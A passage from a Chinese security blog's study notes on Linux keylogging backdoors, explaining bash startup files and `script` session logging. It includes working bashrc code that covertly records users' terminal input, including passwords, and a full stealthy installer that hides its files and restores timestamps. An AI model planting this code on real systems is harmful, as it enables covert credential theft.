<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="0x01 前言本文在编写时参考了以下文章,本文是对以下文章的学习记录.主要记录键盘记录后门相关的实现和利用  man:script man:scriptlive man:scriptreplay 9bie&#x2F;低权 Linux 键盘记录方案 codehz&#x2F;bashrc-backdoor LinuxBackDoor Linux后渗透之收集登录凭证 Yama ptrace攻防对抗 一般">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux键盘记录后门">
<meta property="og:url" content="https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/index.html">
<meta property="og:site_name" content="雪之下二丁目鹤岗八幡宫">
<meta property="og:description" content="0x01 前言本文在编写时参考了以下文章,本文是对以下文章的学习记录.主要记录键盘记录后门相关的实现和利用  man:script man:scriptlive man:scriptreplay 9bie&#x2F;低权 Linux 键盘记录方案 codehz&#x2F;bashrc-backdoor LinuxBackDoor Linux后渗透之收集登录凭证 Yama ptrace攻防对抗 一般">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220314-14:25:37-_e8hDJt_image-20220314142537137_e8hDJt_1647239137648_e8hDJt_image-20220314142537137.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220314-15:09:00-_ugPc8o_image-20220314150900675_ugPc8o_1647241740920_ugPc8o_image-20220314150900675.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-23:55:32-_MfKopN_image-20220314155128863_MfKopN_1647359732612_MfKopN_image-20220314155128863.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220314-20:02:20-_J1IyVK_image-20220314200219896_J1IyVK_1647259340163_J1IyVK_image-20220314200219896.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220314-20:06:13-_hgyW4y_image-20220314200613017_hgyW4y_1647259573257_hgyW4y_image-20220314200613017.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220314-20:10:59-_vlvHD8_image-20220314201059600_vlvHD8_1647259859876_vlvHD8_image-20220314201059600.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220314-20:31:08-_bKwyIT_image-20220314203108658_bKwyIT_1647261068952_bKwyIT_image-20220314203108658.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220314-21:03:31-_jb3nty_image-20220314210331082_jb3nty_1647263011382_jb3nty_image-20220314210331082.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-14:08:10-_Iv4g9J_image-20220315140810558_Iv4g9J_1647324490902_Iv4g9J_image-20220315140810558.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-23:55:54-_5qr1yJ_image-20220315141013107_5qr1yJ_1647359754180_5qr1yJ_image-20220315141013107.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-15:08:43-_OQv8FC_image-20220315150418778_OQv8FC_1647328123930_OQv8FC_image-20220315150418778.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-15:09:03-_fPrMUx_image-20220315150535973_fPrMUx_1647328143552_fPrMUx_image-20220315150535973.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-21:57:07-_BenwFa_image-20220314223211793_BenwFa_1647352627688_BenwFa_image-20220314223211793.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220314-22:31:15-_biFBRR_image-20220314223115052_biFBRR_1647268275404_biFBRR_image-20220314223115052.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-21:54:57-_ynWGMO_image-20220315173815033_ynWGMO_1647352497354_ynWGMO_image-20220315173815033.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-19:34:28-_IAMfpq_image-20220315193428120_IAMfpq_1647344068432_IAMfpq_image-20220315193428120.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-21:54:51-_usx8Hv_image-20220315215423458_usx8Hv_1647352491113_usx8Hv_image-20220315215423458.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-00:59:11-_uvm6NG_image-20220317005901537_uvm6NG_1647449951681_uvm6NG_image-20220317005901537.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-01:02:49-_xfXWIH_image-20220317010249387_xfXWIH_1647450169750_xfXWIH_image-20220317010249387.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-01:08:20-_r0lt3L_image-20220317010820283_r0lt3L_1647450500568_r0lt3L_image-20220317010820283.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-02:45:54-_MYrMGc_image-20220317020750487_MYrMGc_1647456354315_MYrMGc_image-20220317020750487.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-02:09:17-_doRw0z_image-20220317020917139_doRw0z_1647454157443_doRw0z_image-20220317020917139.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-02:12:57-_6snF3G_image-20220317021257527_6snF3G_1647454377830_6snF3G_image-20220317021257527.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-02:14:20-_SLzS1K_image-20220317021420223_SLzS1K_1647454460526_SLzS1K_image-20220317021420223.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-22:46:28-_IubFhD_image-20220315224550349_IubFhD_1647355588644_IubFhD_image-20220315224550349.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-13:30:07-_i0wFyj_image-20220317133007534_i0wFyj_1647495007937_i0wFyj_image-20220317133007534.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-12:56:14-_8uqW8W_image-20220317125614053_8uqW8W_1647492974484_8uqW8W_image-20220317125614053.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-12:59:19-_8d47Uz_image-20220317125919278_8d47Uz_1647493159831_8d47Uz_image-20220317125919278.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-15:53:12-_CbcWJS_image-20220317155312451_CbcWJS_1647503592810_CbcWJS_image-20220317155312451.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220317-20:17:02-_1SVj1A_image-20220317201653006_1SVj1A_1647519422568_1SVj1A_image-20220317201653006.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-23:03:59-_F57VVL_image-20220315230359527_F57VVL_1647356639929_F57VVL_image-20220315230359527.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-15:29:20-_VYYX3I_image-20220315152920187_VYYX3I_1647329360471_VYYX3I_image-20220315152920187.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-15:56:15-_ixSP1u_image-20220315155615246_ixSP1u_1647330975507_ixSP1u_image-20220315155615246.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220315-15:57:15-_pvbnu4_image-20220315155715043_pvbnu4_1647331035292_pvbnu4_image-20220315155715043.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220316-14:58:16-_qBOSrj_image-20220316145816023_qBOSrj_1647413896307_qBOSrj_image-20220316145816023.png">
<meta property="og:image" content="https://images.atsud0.me/images/post/20220316-14:55:42-_Aowbm8_image-20220316145542554_Aowbm8_1647413742830_Aowbm8_image-20220316145542554.png">
<meta property="article:published_time" content="2022-03-14T04:51:32.000Z">
<meta property="article:modified_time" content="2022-03-19T09:56:48.000Z">
<meta property="article:author" content="atsud0">
<meta property="article:tag" content="Linux">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://images.atsud0.me/images/post/20220314-14:25:37-_e8hDJt_image-20220314142537137_e8hDJt_1647239137648_e8hDJt_image-20220314142537137.png">
    
    
      
        
          
            <link rel="shortcut icon" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=48">
          
        
      
      
        
          
            <link rel="icon" type="image/png" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=192" sizes="192x192">
          
        
      
      
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="https://www.gravatar.com/avatar/833e6979e17dd10aebe34f34c0fd5f7d?s=180">
          
        
      
    
    <!-- title -->
    <title>Linux键盘记录后门</title>
    <!-- async scripts -->
    <!-- Google Analytics -->

  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-163969429-1"></script>
  <script>
      window.dataLayer = window.dataLayer || [];
      function gtag(){dataLayer.push(arguments);}
      gtag('js', new Date());
      gtag('config', 'UA-163969429-1');
  </script>


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/true" title="雪之下二丁目鹤岗八幡宫" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/links/">Friends</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/atsud0">Github</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        
        <li><a class="icon" aria-label="Next post" href="/2022/03/%E3%80%90%E5%9F%9F%E6%B8%97%E9%80%8F%E3%80%91Windows-SSP-Mimikatz%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/&text=Linux键盘记录后门"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/&title=Linux键盘记录后门"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Linux键盘记录后门&body=Check out this article: https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/&title=Linux键盘记录后门"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/&name=Linux键盘记录后门&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://atsud0.me/2022/03/Linux%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8/&t=Linux键盘记录后门"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-script%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95%E5%90%8E%E9%97%A8"><span class="toc-number">2.</span> <span class="toc-text">0x02 script键盘记录后门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Bash%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E5%8A%A0%E8%BD%BD%E9%A1%BA%E5%BA%8F"><span class="toc-number">2.1.</span> <span class="toc-text">Bash配置文件加载顺序</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Script%E5%91%BD%E4%BB%A4"><span class="toc-number">2.2.</span> <span class="toc-text">Script命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CodeHz%E7%9A%84Bashrc-BackDoor"><span class="toc-number">2.3.</span> <span class="toc-text">CodeHz的Bashrc-BackDoor</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x03-Strace-%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81"><span class="toc-number">3.</span> <span class="toc-text">0x03 Strace 记录密码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%89%E8%A3%85strace"><span class="toc-number">3.1.</span> <span class="toc-text">安装strace</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80-strace%E5%90%AF%E5%8A%A8%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.2.</span> <span class="toc-text">方法一 strace启动进程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C-strace-%E5%B7%B2%E6%9C%89%E8%BF%9B%E7%A8%8B"><span class="toc-number">3.3.</span> <span class="toc-text">方法二 strace 已有进程</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x04-PAM%E8%AE%B0%E5%BD%95%E5%AF%86%E7%A0%81"><span class="toc-number">4.</span> <span class="toc-text">0x04 PAM记录密码</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%BF%E6%8D%A2pam-unix-so"><span class="toc-number">4.1.</span> <span class="toc-text">替换pam_unix.so</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PAM%E5%92%8CLD-PRELOAD%E5%8A%AB%E6%8C%81%E7%BB%93%E5%90%88DNS%E5%B8%A6%E5%A4%96%E5%8F%91%E9%80%81%E5%AF%86%E7%A0%81"><span class="toc-number">4.2.</span> <span class="toc-text">PAM和LD_PRELOAD劫持结合DNS带外发送密码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#sshLooterC"><span class="toc-number">4.3.</span> <span class="toc-text">sshLooterC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x05-%E9%98%B2%E5%BE%A1-amp-%E6%A3%80%E6%B5%8B%E6%96%B9%E5%BC%8F"><span class="toc-number">5.</span> <span class="toc-text">0x05 防御&amp;检测方式</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x06-%E5%B0%8F%E7%BB%93"><span class="toc-number">6.</span> <span class="toc-text">0x06 小结</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        Linux键盘记录后门
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">atsud0</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-03-14T04:51:32.000Z" class="dt-published" itemprop="datePublished">2022-03-14</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fa-solid fa-archive"></i>
        <a class="category-link" href="/categories/Note/">Note</a>
    </div>


      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/Linux/" rel="tag">Linux</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h1 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h1><p>本文在编写时参考了以下文章,本文是对以下文章的学习记录.主要记录键盘记录后门相关的实现和利用</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man1/script.1.html">man:script</a></li>
<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man1/scriptlive.1.html">man:scriptlive</a></li>
<li><a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man1/scriptreplay.1.html">man:scriptreplay</a></li>
<li><a target="_blank" rel="noopener" href="https://forum.90sec.com/t/topic/1948">9bie&#x2F;低权 Linux 键盘记录方案</a></li>
<li><a target="_blank" rel="noopener" href="https://github.com/codehz/bashrc-backdoor">codehz&#x2F;bashrc-backdoor</a></li>
<li><a target="_blank" rel="noopener" href="https://wooyun.js.org/drops/Linux%20Backdoor.html">LinuxBackDoor</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7698">Linux后渗透之收集登录凭证</a></li>
<li><a target="_blank" rel="noopener" href="https://www.kernel.org/doc/Documentation/security/Yama.txt">Yama</a></li>
<li><a target="_blank" rel="noopener" href="https://onestraw.github.io/linux/ptrace-hack/">ptrace攻防对抗</a></li>
<li><a target="_blank" rel="noopener" href="https://9bie.org/index.php/archives/742/">一般路过PAM后门&#x2F;SSH密码记录</a></li>
<li><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7902">Linux Pam后门总结拓展</a></li>
<li><a target="_blank" rel="noopener" href="https://x-c3ll.github.io/posts/PAM-backdoor-DNS/">PAM-backdoor-DNS</a></li>
</ul>
<h1 id="0x02-script键盘记录后门"><a href="#0x02-script键盘记录后门" class="headerlink" title="0x02 script键盘记录后门"></a>0x02 script键盘记录后门</h1><h2 id="Bash配置文件加载顺序"><a href="#Bash配置文件加载顺序" class="headerlink" title="Bash配置文件加载顺序"></a>Bash配置文件加载顺序</h2><p>当一个Linux用户正常的以交互方式启动bash 时,将会根据顺序读取以下文件的环境变量(不同shell可能不一样)</p>
<p>如:Debian 10的bash.</p>
<p><code>/etc/profile</code> -&gt; <code>/etc/bash.bashrc</code> -&gt;<code>~/.bash_profile </code>(如果不存在就会依次去尝试读<code>~/.bash_login</code>或者<code>~/.profile</code>) -&gt;<code>~/.bashrc</code></p>
<p>当退出登录时 就会去读<code>~/.bash_logout</code>. </p>
<p><img src="https://images.atsud0.me/images/post/20220314-14:25:37-_e8hDJt_image-20220314142537137_e8hDJt_1647239137648_e8hDJt_image-20220314142537137.png" alt="image-20220314142537137"></p>
<p>而这些配置文件,是以<code>shell语言</code>编写的,简而言之就是,当正常登录的时候bash会执行这些配置文件的命令,既然可以执行命令 那我们岂不是可以 搞点事情?当用户登录时执行我们的命令?</p>
<p><img src="https://images.atsud0.me/images/post/20220314-15:09:00-_ugPc8o_image-20220314150900675_ugPc8o_1647241740920_ugPc8o_image-20220314150900675.png" alt="image-20220314150900675"></p>
<h2 id="Script命令"><a href="#Script命令" class="headerlink" title="Script命令"></a>Script命令</h2><p>理解了简单的bash启动流程后,来看个命令<code>sciprt</code>.先来看看他的帮助手册吧:<a target="_blank" rel="noopener" href="https://man7.org/linux/man-pages/man1/script.1.html">man7_script</a></p>
<p><img src="https://images.atsud0.me/images/post/20220315-23:55:32-_MfKopN_image-20220314155128863_MfKopN_1647359732612_MfKopN_image-20220314155128863.png" alt="image-20220314155128863"></p>
<p>关注一下这两段介绍:</p>
<blockquote>
<p>script命令会将终端会话里的所有内容以保存成文件,可以通过部分参数来打开时间开关,如果需要通过scriptereplay来重放会话,那么计时日志是必须的参数.</p>
<p>如果使用–log-in或者–log-io参数可能会存在安全风险,因为会记录终端输入比如密码之类的敏感信息</p>
</blockquote>
<p>诶 会记录密码啊,你说这个我就感兴趣了啊,我们来看看要怎么才能记录到我们终端输入的密码:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script -T time.txt -B tmp.txt <span class="comment">#-T 是记录时间戳,-T可不要.-B将输入输出文件都保存到一个文件上,没有-B不行.</span></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220314-20:02:20-_J1IyVK_image-20220314200219896_J1IyVK_1647259340163_J1IyVK_image-20220314200219896.png" alt="image-20220314200219896"></p>
<p>看描述–log-io相当于指定了<code>--log-in</code> 和 <code>--log-out</code>的参数,所以尝试分别指定<code>--log-in</code>和<code>--log-out</code>为相同的文件 看能不能获得和<code>--log-io</code>相同的效果</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">script -I test.txt -O test.txt -T time <span class="comment">#指定-I 和 -O 为同一个文件</span></span><br></pre></td></tr></table></figure>

<p><img src="https://images.atsud0.me/images/post/20220314-20:06:13-_hgyW4y_image-20220314200613017_hgyW4y_1647259573257_hgyW4y_image-20220314200613017.png" alt="image-20220314200613017"></p>
<p>但是文件分开记录就不行</p>
<p><img src="https://images.atsud0.me/images/post/20220314-20:10:59-_vlvHD8_image-20220314201059600_vlvHD8_1647259859876_vlvHD8_image-20220314201059600.png" alt="image-20220314201059600"></p>
<p>根据man手册,我们可以知道script是在2.35版本之后引入的<code>logstream</code>功能所以2.35之前的没有<code>logstream</code>的功能,自然就无法用这种方法记录密码.</p>
<p><img src="https://images.atsud0.me/images/post/20220314-20:31:08-_bKwyIT_image-20220314203108658_bKwyIT_1647261068952_bKwyIT_image-20220314203108658.png" alt="image-20220314203108658"></p>
<p>script各版本发布的时间:</p>
<p><img src="https://images.atsud0.me/images/post/20220314-21:03:31-_jb3nty_image-20220314210331082_jb3nty_1647263011382_jb3nty_image-20220314210331082.png" alt="image-20220314210331082"></p>
<p>那么问题来了,我们要怎么利用呢,还记得文章开头的<code>bashrc</code>文件吗.是的,我们只需要把以下命令写入到对应用户的<code>bashrc</code>文件中,每次登录<code>bash</code>后就会运行.当然你也可以修改成更隐蔽一点的文件名</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ -f /tmp/script.lock ];<span class="keyword">then</span></span><br><span class="line">        <span class="built_in">rm</span> /tmp/script.lock</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">        <span class="built_in">echo</span> lock &gt; /tmp/script.lock</span><br><span class="line">        <span class="built_in">exec</span> script -B /tmp/test -aqf</span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>



<p>这种方案的话其实很容易被发现..也很可疑.我们来看看另外一种实现</p>
<h2 id="CodeHz的Bashrc-BackDoor"><a href="#CodeHz的Bashrc-BackDoor" class="headerlink" title="CodeHz的Bashrc-BackDoor"></a>CodeHz的Bashrc-BackDoor</h2><p>Github:<a target="_blank" rel="noopener" href="https://github.com/codehz">codehz</a>&#x2F;<strong><a target="_blank" rel="noopener" href="https://github.com/codehz/bashrc-backdoor">bashrc-backdoor</a></strong>(还有利用&#x2F;dev&#x2F;tcp上传记录日志文件的实现)</p>
<p>codehz佬的这个好处在很难被用户检测到,而且不依赖其他东西.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="comment"># CUSTIMIZE BEFORE UPLOAD</span></span><br><span class="line"></span><br><span class="line">fakerc=~/.bаsh_login <span class="comment">#注意这里的a是其他编码的</span></span><br><span class="line">logfile=~/.bаsh_cache <span class="comment">#注意这里的a是其他编码的</span></span><br><span class="line">waitsec=1</span><br><span class="line">changetime=$(<span class="built_in">stat</span> -c %Y ~/.bashrc) <span class="comment">#bashrc的时间戳</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">read</span> script &lt;&lt;<span class="string">EOF</span></span><br><span class="line"><span class="string">exec script -B &quot;$logfile&quot; -afqc &quot;bash --rcfile &#x27;$fakerc&#x27;&quot;</span></span><br><span class="line"><span class="string">EOF</span></span><br><span class="line">quoted=$(<span class="built_in">printf</span> <span class="string">&quot;%q&quot;</span> <span class="string">&quot;<span class="variable">$script</span>&quot;</span>)</span><br><span class="line"><span class="comment">#afqc 追加 时刻刷新 安静模式 命令模式 bash --rcfile ~/.bash_login 指定bash的配置文件为 .bash_login </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># UI BEGIN 把上面的变量配置输出给人看</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">print</span></span>() &#123; <span class="built_in">echo</span> -e <span class="string">&quot;$*&quot;</span>; &#125;</span><br><span class="line"><span class="function"><span class="title">printvar</span></span>() &#123; <span class="built_in">printf</span> <span class="string">&quot; + \e[1;32m%s\e[m = \e[4;5m%s\e[m\n&quot;</span> <span class="variable">$1</span> <span class="string">&quot;<span class="variable">$&#123;!1&#125;</span>&quot;</span>; &#125;</span><br><span class="line"></span><br><span class="line">printvar fakerc</span><br><span class="line">printvar logfile</span><br><span class="line">printvar script</span><br><span class="line">printvar quoted</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;\e[5;7m  wait for \e[1m<span class="variable">$waitsec</span>\e[0;5;7m secs, ctrl+c to interrupt  \e[m&quot;</span></span><br><span class="line"><span class="built_in">sleep</span> <span class="variable">$waitsec</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;installing...&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># UI END</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> &gt;<span class="string">&quot;<span class="variable">$fakerc</span>&quot;</span> &lt;&lt;<span class="string">EOF #将以下内容写入$fakerc文件</span></span><br><span class="line"><span class="string">self=\$(cat &quot;$fakerc&quot;) #读取fakerc的文件内容</span></span><br><span class="line"><span class="string">self=\$(printf &quot;%q&quot; &quot;\$self&quot;) #转义特殊字符</span></span><br><span class="line"><span class="string">rm -f &quot;$fakerc&quot; # 删除fakerc文件,隐藏自身</span></span><br><span class="line"><span class="string">sed -i &quot;/^exec script -B/d&quot; ~/.bashrc #将bashrc中的script记录命令删除</span></span><br><span class="line"><span class="string">touch -d @$changetime ~/.bashrc #恢复修改前的时间戳</span></span><br><span class="line"><span class="string">trap &quot;echo $quoted &gt;&gt; ~/.bashrc &amp;&amp; echo \$self &gt; &#x27;$fakerc&#x27;&quot; EXIT # 当收到EXIT信号时 执行命令:echo 转义后的$script 追加到~/.bashrc 和fakerc内容写入到fakerc文件里面</span></span><br><span class="line"><span class="string">unset self #取消变量</span></span><br><span class="line"><span class="string">. ~/.bashrc # 执行正确的bashrc 避免被用户发现异常</span></span><br><span class="line"><span class="string">EOF</span> <span class="comment">#结束</span></span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$script</span> &gt;&gt; ~/.bashrc <span class="comment">#将script变量追加到bashrc文件中</span></span><br></pre></td></tr></table></figure>

<p>方法是好方法,但是我感觉有点bug,比如fakerc和logfile的a用其他编码,codehz佬说是为了避免直接被bash补全到,但是实际上使用会变成:<code>.b&#39;$&#39;\320\260&#39;&#39;sh_login&#39;</code>,总感觉更加可疑了呢.</p>
<p>并且我这虚拟机本地复现使用 ssh登录就会这样,先是无响应一会,然后返回错误信息:</p>
<p><img src="https://images.atsud0.me/images/post/20220315-14:08:10-_Iv4g9J_image-20220315140810558_Iv4g9J_1647324490902_Iv4g9J_image-20220315140810558.png" alt="image-20220315140810558"></p>
<p>开个pspy看看它在干嘛</p>
